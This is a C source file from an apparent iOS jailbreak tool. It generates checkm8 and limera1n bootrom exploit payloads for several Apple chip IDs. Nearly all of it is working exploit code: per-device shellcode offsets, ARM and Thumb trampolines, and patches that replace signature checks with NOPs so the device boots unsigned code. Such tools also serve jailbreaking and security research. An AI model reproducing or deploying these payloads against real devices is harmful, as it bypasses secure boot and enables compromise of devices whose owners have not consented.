/*
 * payload.c
 * copyright (C) 2020/05/25 dora2ios
 *
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include <ircv.h>
#include <checkm8.h>

#include <limera1n_p.h>
#include <checkm8_p.h>

#define bswap32                 __builtin_bswap32

#define IMG3_MAGIC              0x496D6733
#define TAG_KBAG                0x4b424147
#define TAG_DATA                0x44415441
#define AES_TYPE_GID            0x20000200
#define AES_MODE_256            0x20000000

#define PAYLOAD_OFFSET_ARMV7    384
#define PAYLOAD_SIZE_ARMV7      0xb00
#define TRAMPOLINE_SIZE_ARMV7   sizeof(uint64_t)

// for 64-bit
unsigned char trampoline64[] = {
    0x68, 0x65, 0x6c, 0x6c, // - 0
    0x6f, 0x20, 0x6b, 0x69, // - 4
    0x6e, 0x2d, 0x69, 0x72, // - 8
    0x6f, 0x20, 0x6d, 0x6f, // - 12
    0x73, 0x61, 0x69, 0x63  // - 16
};

// based on synackuk's belladonna
// https://github.com/synackuk/belladonna/blob/824363bbc287da3cd2d97cba69aa746db89a86b6/src/exploits/checkm8/payload_gen.c

static char* thumb_trampoline(uint32_t src, uint32_t dest) {
    char* trampoline = malloc(TRAMPOLINE_SIZE_ARMV7);
    if(src % 2 != 1 || dest % 2 != 1) {
        free(trampoline);
        return NULL;
    }
    if(src % 4 == 1) {
        *(uint32_t*) trampoline = 0xF000F8DF;
        *(uint32_t*) (trampoline + sizeof(uint32_t)) = dest;
    }
    else {
        *(uint32_t*) trampoline = 0xF002F8DF;
        *(uint32_t*) (trampoline + sizeof(uint32_t)) = dest;
    }
    return trampoline;
}

static char* asm_arm64_x7_trampoline(uint64_t src) {
    char* trampoline = malloc(sizeof(16));
    *(uint64_t*) trampoline = 0xd61f00e058000047;
    *(uint64_t*) (trampoline + sizeof(uint64_t)) = src;
    return trampoline;
}

static char* asm_arm64_branch(uint32_t src, uint32_t dest) {
    char* trampoline = malloc(sizeof(uint32_t));
    uint32_t value;
    if(src > dest) {
        value = 0x18000000 - (src - dest) / 4;
    } else{
        value = 0x14000000 + (dest - src) / 4;
    }
    
    *(uint32_t*) trampoline = value;
    return trampoline;
}


static int add_payload_offsets(unsigned char* payload, size_t payload_len, uint32_t* offsets, size_t num_offsets) {
    for(size_t i = 0; i < num_offsets; i++) {
        uint32_t value = 0xBAD00001 + i;
        char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
        if(!ptr) {
            return -1;
        }
        *(uint32_t*) ptr = offsets[i];
    }
    return 0;
}

static int add_payload_offsets64(unsigned char* payload, size_t payload_len, uint64_t* offsets, size_t num_offsets) {
    for(int i = 0; i < num_offsets; i++) {
        uint64_t value = 0x00000000BAD00001 + i;
        char* ptr = memmem(payload, payload_len, &value, sizeof(uint64_t));
        if(!ptr) {
            return -1;
        }
        *(uint64_t*) ptr = offsets[i];
    }
    return 0;
}


static int add_trampoline(unsigned char* payload, size_t payload_len, char* trampoline, size_t trampoline_len) {
    uint32_t value = 0xFEEDFACE;
    char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
    if(!ptr) {
        return -1;
    }
    memcpy(ptr, trampoline, trampoline_len);
    return 0;
}

static int add_trampoline64_asm_arm64_x7_trampoline(unsigned char* payload, size_t payload_len, char* trampoline, size_t trampoline_len) {
    unsigned char val[16];
    int i;
    for(i = 0; i < 16; i++){
        val[i] = trampoline64[i];
    }
    
    char* ptr = memmem(payload, payload_len, &val, sizeof(16));
    if(!ptr) {
        return -1;
    }
    memcpy(ptr, trampoline, trampoline_len);
    return 0;
}

static int add_trampoline64_asm_arm64_branch(unsigned char* payload, size_t payload_len, char* trampoline, size_t trampoline_len) {
    unsigned char val[4];
    int i;
    for(i = 0; i < 4; i++){
        val[i] = trampoline64[i+16];
    }
    
    char* ptr = memmem(payload, payload_len, &val, sizeof(4));
    if(!ptr) {
        return -1;
    }
    memcpy(ptr, trampoline, trampoline_len);
    return 0;
}


int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_32_t* config) {
    int ret;
    
    uint32_t* shellcode_constants;
    size_t shellcode_constants_len;
    uint32_t* usb_constants;
    size_t usb_constants_len;
    
    uint64_t* shellcode_constants64;
    uint64_t* usb_constants64;
    
    char* trampoline;
    char* trampoline2;
    size_t trampoline_len;
    size_t trampoline2_len;
    
    switch(cpid) {
        case 0x8950:
            config->payload = malloc(checkm8_payload_length_armv7_with_img3_p);
            config->payload_len = checkm8_payload_length_armv7_with_img3_p;
            memcpy(config->payload, checkm8_payload_armv7_with_img3_p, checkm8_payload_length_armv7_with_img3_p);
            
            shellcode_constants = (uint32_t[0x8]){
                0x10061988,             // 1 - gUSBDescriptors
                0x10061F80,             // 2 - gUSBSerialNumber
                0x7C55,                 // 3 - usb_create_string_descriptor
                0x100600D8,             // 4 - gUSBSRNMStringDescriptor
                0x10079800,             // 5 - PAYLOAD_DEST
                PAYLOAD_OFFSET_ARMV7,   // 6 - PAYLOAD_OFFSET
                PAYLOAD_SIZE_ARMV7,     // 7 - PAYLOAD_SIZE
                0x10061A24,             // 8 - PAYLOAD_PTR
            };
            shellcode_constants_len = 0x8;
            
            usb_constants = (uint32_t[0xb]){
                0x10000000,             // 1 - LOAD_ADDRESS
                IMG3_MAGIC,             // 2 - IMG_MAGIC
                TAG_DATA,               // 3 - TAG_DATA
                TAG_KBAG,               // 4 - TAG_KBAG
                0xea00000e,             // 5 - vector
                AES_TYPE_GID,           // 6 - AES_TYPE_GID
                0x7301,                 // 7 - AES_CRYPTO_CMD
                AES_MODE_256,           // 8 - AES_MODE_256
                0x1007a225,             // 9 - iBoot32Patcher_PTR
                0x6E85,                 // a - GET_BOOT_TRAMPOLINE
                0x5F81,                 // b - JUMPTO
            };
            usb_constants_len = 0xb;
            
            trampoline = thumb_trampoline(0x10079800+1, 0x8160+1);
            if(!trampoline) {
                printf("\x1b[31mERROR: Failed to build payload trampoline.\x1b[39m\n");
                return -1;
            }
            trampoline_len = TRAMPOLINE_SIZE_ARMV7;
            break;
            
        case 0x8955:
            config->payload = malloc(checkm8_payload_length_armv7_with_img3_p);
            config->payload_len = checkm8_payload_length_armv7_with_img3_p;
            memcpy(config->payload, checkm8_payload_armv7_with_img3_p, checkm8_payload_length_armv7_with_img3_p);
            
            shellcode_constants = (uint32_t[0x8]){
                0x10061988,             // 1 - gUSBDescriptors
                0x10061F80,             // 2 - gUSBSerialNumber
                0x7C95,                 // 3 - usb_create_string_descriptor
                0x100600D8,             // 4 - gUSBSRNMStringDescriptor
                0x10079800,             // 5 - PAYLOAD_DEST
                PAYLOAD_OFFSET_ARMV7,   // 6 - PAYLOAD_OFFSET
                PAYLOAD_SIZE_ARMV7,     // 7 - PAYLOAD_SIZE
                0x10061A24,             // 8 - PAYLOAD_PTR
            };
            shellcode_constants_len = 0x8;
            
            usb_constants = (uint32_t[0xb]){
                0x10000000,             // 1 - LOAD_ADDRESS
                IMG3_MAGIC,             // 2 - IMG_MAGIC
                TAG_DATA,               // 3 - TAG_DATA
                TAG_KBAG,               // 4 - TAG_KBAG
                0xea00000e,             // 5 - vector
                AES_TYPE_GID,           // 6 - AES_TYPE_GID
                0x7341,                 // 7 - AES_CRYPTO_CMD
                AES_MODE_256,           // 8 - AES_MODE_256
                0x1007a225,             // 9 - iBoot32Patcher_PTR
                0x6EC5,                 // a - GET_BOOT_TRAMPOLINE
                0x5FC1,                 // b - JUMPTO
            };
            usb_constants_len = 0xb;
            
            trampoline = thumb_trampoline(0x10079800+1, 0x81A0+1);
            if(!trampoline) {
                printf("\x1b[31mERROR: Failed to build payload trampoline.\x1b[39m\n");
                return -1;
            }
            trampoline_len = TRAMPOLINE_SIZE_ARMV7;
            break;
            
        case 0x8960:
            config->payload = malloc(checkm8_payload_length_arm64);
            config->payload_len = checkm8_payload_length_arm64;
            memcpy(config->payload, checkm8_payload_arm64, checkm8_payload_length_arm64);
            
            shellcode_constants64 = (uint64_t[0xd]){
                0x180086B58,        // 1 - gUSBDescriptors
                0x180086CDC,        // 2 - gUSBSerialNumber
                0x10000BFEC,        // 3 - usb_create_string_descriptor
                0x180080562,        // 4 - gUSBSRNMStringDescriptor
                0x18037FC00,        // 5 - PAYLOAD_DEST
                544,                // 6 - PAYLOAD_OFFSET
                576,                // 7 - PAYLOAD_SIZE
                0x180086C70,        // 8 - PAYLOAD_PTR
                0x1000054e4,        // 9 - SIGCHECK_1
                0xd503201fd503201f, // A - NOP_NOP
                0x1000054b4,        // B - SIGCHECK_2
                0x39029fe152800021, // C - movz w1, #0x1
                                    //     strb w1, [sp, #0xa7]
                0x3902abe13902a7e1, // D - strb w1, [sp, #0xa9]
                                    //     strb w1, [sp, #0xaa]
            };
            shellcode_constants_len = 0xd;
            
            usb_constants64 = (uint64_t[0x6]){
                0x180380000,        // 1 - LOAD_ADDRESS
                0x6578656365786563, // 2 - EXEC_MAGIC
                0x646F6E65646F6E65, // 3 - DONE_MAGIC
                0x6D656D636D656D63, // 4 - MEMC_MAGIC
                0x6D656D736D656D73, // 5 - MEMS_MAGIC
                0x10000CC78,        // 6 - USB_CORE_DO_IO
            };
            usb_constants_len = 0x6;
            
            trampoline = asm_arm64_x7_trampoline(0x10000CFB4);
            if(!trampoline) {
                printf("\x1b[31mERROR: Failed to build payload trampoline.\x1b[39m\n");
                return -1;
            }
            trampoline_len = 0x10;
            
            trampoline2 = asm_arm64_branch(0x10, 0x0);
            if(!trampoline2) {
                printf("\x1b[31mERROR: Failed to build payload trampoline.\x1b[39m\n");
                return -1;
            }
            trampoline2_len = sizeof(uint32_t);
            break;
        
        default:
            printf("No payload offsets are available for your device.\n");
            return -1;
    }
    
    if((cpid|0xf) == 0x895f){
        ret = add_payload_offsets(config->payload, config->payload_len, shellcode_constants, shellcode_constants_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add offsets to payload.\x1b[39m\n");
            return -1;
        }
        ret = add_payload_offsets(config->payload, config->payload_len, usb_constants, usb_constants_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add offsets to payload.\x1b[39m\n");
            return -1;
        }
        ret = add_trampoline(config->payload, config->payload_len, trampoline, trampoline_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add trampoline to payload.\x1b[39m\n");
            return -1;
        }
    }
    
    if(cpid == 0x8960){
        ret = add_payload_offsets64(config->payload, config->payload_len, shellcode_constants64, shellcode_constants_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add offsets to payload.\x1b[39m\n");
            return -1;
        }
        ret = add_payload_offsets64(config->payload, config->payload_len, usb_constants64, usb_constants_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add offsets to payload.\x1b[39m\n");
            return -1;
        }
        ret = add_trampoline64_asm_arm64_x7_trampoline(config->payload, config->payload_len, trampoline, trampoline_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add trampoline1 to payload.\x1b[39m\n");
            return -1;
        }
        
        ret = add_trampoline64_asm_arm64_branch(config->payload, config->payload_len, trampoline2, trampoline2_len);
        if(ret != 0) {
            printf("\x1b[31mERROR: Failed to add trampoline2 to payload.\x1b[39m\n");
            return -1;
        }
    }
    
    return 0;
}


// limera1n helper
static int add_exploit_lr(unsigned char* payload, size_t payload_len, uint32_t* exploit_lr, size_t exploit_lr_len) {
    uint32_t magic = 0xFEEDFACE;
    char* ptr;
    
    for(int i = 0; i < 0x10; i++) {
        ptr = memmem(payload, payload_len, &magic, sizeof(uint32_t));
        if(!ptr) {
            return -1;
        }
        memcpy(ptr, exploit_lr, exploit_lr_len);
    }
    
    return 0;
}

int gen_limera1n(int cpid, int rom, unsigned char** payload, size_t* payload_len) {
    int ret;
    *payload = malloc(limera1n_payload_len);
    *payload_len = limera1n_payload_len;
    memcpy(*payload, limera1n_payload, limera1n_payload_len);
    
    uint32_t* shellcode_constants;
    size_t shellcode_constants_len;
    uint32_t* exploit_lr;
    exploit_lr = malloc(sizeof(uint32_t));
    
    switch(cpid) {
        case 0x8920:
            if(rom == 0){ // oldBR
                shellcode_constants = (uint32_t[22]){
                    0x84031800, //  1 - RELOCATE_SHELLCODE_ADDRESS
                    1024,       //  2 - RELOCATE_SHELLCODE_SIZE
                    0x83d4,     //  3 - memmove
                    0x84034000, //  4 - MAIN_STACK_ADDRESS
                    0x43c9,     //  5 - nor_power_on
                    0x5ded,     //  6 - nor_init
                    0x84024820, //  7 - gUSBSerialNumber
                    0x8e7d,     //  8 - strlcat
                    0x349d,     //  9 - usb_wait_for_image
                    0x84000000, // 10 - LOAD_ADDRESS
                    0x24000,    // 11 - MAX_SIZE
                    0x84024228, // 12 - gLeakingDFUBuffer
                    0x1ccd,     // 13 - free
                    0x65786563, // 14 - EXEC_MAGIC
                    0x1f79,     // 15 - memz_create
                    0x3969,     // 16 - jump_to
                    0x1fa1,     // 17 - memz_destroy
                    0x60,       // 18 - IMAGE3_LOAD_SP_OFFSET
                    0x50,       // 19 - IMAGE3_LOAD_STRUCT_OFFSET
                    0x1fe5,     // 20 - image3_create_struct
                    0x2655,     // 21 - image3_load_continue
                    0x277b,     // 22 - image3_load_fail
                };
                shellcode_constants_len = 22;
            }
            if(rom == 1){ // newBR
                shellcode_constants = (uint32_t[22]){
                    0x84031800, //  1 - RELOCATE_SHELLCODE_ADDRESS
                    1024,       //  2 - RELOCATE_SHELLCODE_SIZE
                    0x83dc,     //  3 - memmove
                    0x84034000, //  4 - MAIN_STACK_ADDRESS
                    0x43d1,     //  5 - nor_power_on
                    0x5df5,     //  6 - nor_init
                    0x84024820, //  7 - gUSBSerialNumber
                    0x8e85,     //  8 - strlcat
                    0x34a5,     //  9 - usb_wait_for_image
                    0x84000000, // 10 - LOAD_ADDRESS
                    0x24000,    // 11 - MAX_SIZE
                    0x84024228, // 12 - gLeakingDFUBuffer
                    0x1ccd,     // 13 - free
                    0x65786563, // 14 - EXEC_MAGIC
                    0x1f81,     // 15 - memz_create
                    0x3971,     // 16 - jump_to
                    0x1fa9,     // 17 - memz_destroy
                    0x60,       // 18 - IMAGE3_LOAD_SP_OFFSET
                    0x50,       // 19 - IMAGE3_LOAD_STRUCT_OFFSET
                    0x1fed,     // 20 - image3_create_struct
                    0x265d,     // 21 - image3_load_continue
                    0x2783,     // 22 - image3_load_fail
                };
                shellcode_constants_len = 22;
            }
            *(uint32_t*)exploit_lr = 0x84033FA4;
            break;
        case 0x8922:
            shellcode_constants = (uint32_t[22]){
                0x84031800, //  1 - RELOCATE_SHELLCODE_ADDRESS
                1024,       //  2 - RELOCATE_SHELLCODE_SIZE
                0x8564,     //  3 - memmove
                0x84034000, //  4 - MAIN_STACK_ADDRESS
                0x43b9,     //  5 - nor_power_on
                0x5f75,     //  6 - nor_init
                0x84024750, //  7 - gUSBSerialNumber
                0x901d,     //  8 - strlcat
                0x36e5,     //  9 - usb_wait_for_image
                0x84000000, // 10 - LOAD_ADDRESS
                0x24000,    // 11 - MAX_SIZE
                0x84024158, // 12 - gLeakingDFUBuffer
                0x1a51,     // 13 - free
                0x65786563, // 14 - EXEC_MAGIC
                0x1f25,     // 15 - memz_create
                0x39dd,     // 16 - jump_to
                0x1f0d,     // 17 - memz_destroy
                0x64,       // 18 - IMAGE3_LOAD_SP_OFFSET
                0x60,       // 19 - IMAGE3_LOAD_STRUCT_OFFSET
                0x2113,     // 20 - image3_create_struct
                0x2665,     // 21 - image3_load_continue
                0x276d,     // 22 - image3_load_fail
            };
            shellcode_constants_len = 22;
            *(uint32_t*)exploit_lr = 0x84033F98;
            break;
        case 0x8930:
            shellcode_constants = (uint32_t[22]){
                0x84039800, //  1 - RELOCATE_SHELLCODE_ADDRESS
                1024,       //  2 - RELOCATE_SHELLCODE_SIZE
                0x84dc,     //  3 - memmove
                0x8403c000, //  4 - MAIN_STACK_ADDRESS
                0x4e8d,     //  5 - nor_power_on
                0x690d,     //  6 - nor_init
                0x8402e0e0, //  7 - gUSBSerialNumber
                0x90c9,     //  8 - strlcat
                0x4c85,     //  9 - usb_wait_for_image
                0x84000000, // 10 - LOAD_ADDRESS
                0x2c000,    // 11 - MAX_SIZE
                0x8402dbcc, // 12 - gLeakingDFUBuffer
                0x3b95,     // 13 - free
                0x65786563, // 14 - EXEC_MAGIC
                0x7469,     // 15 - memz_create
                0x5a5d,     // 16 - jump_to
                0x7451,     // 17 - memz_destroy
                0x68,       // 18 - IMAGE3_LOAD_SP_OFFSET
                0x64,       // 19 - IMAGE3_LOAD_STRUCT_OFFSET
                0x412d,     // 20 - image3_create_struct
                0x46db,     // 21 - image3_load_continue
                0x47db,     // 22 - image3_load_fail
            };
            shellcode_constants_len = 22;
            *(uint32_t*)exploit_lr = 0x8403BF9C;
            break;
        default:
            printf("\x1b[31mERROR: No payload offsets are available for this device.\x1b[39m\n");
            return -1;
    }
    
    
    ret = add_payload_offsets(*payload, *payload_len, shellcode_constants, shellcode_constants_len);
    if(ret != 0) {
        printf("\x1b[31mERROR: Failed to add offsets to payload.\x1b[39m\n");
        return -1;
    }
    
    ret = add_exploit_lr(*payload, *payload_len, exploit_lr, 4);
    if(ret != 0) {
        printf("\x1b[31mERROR: Failed to add exploit_lr to payload.\x1b[39m\n");
        return -1;
    }
    
    return 0;
}
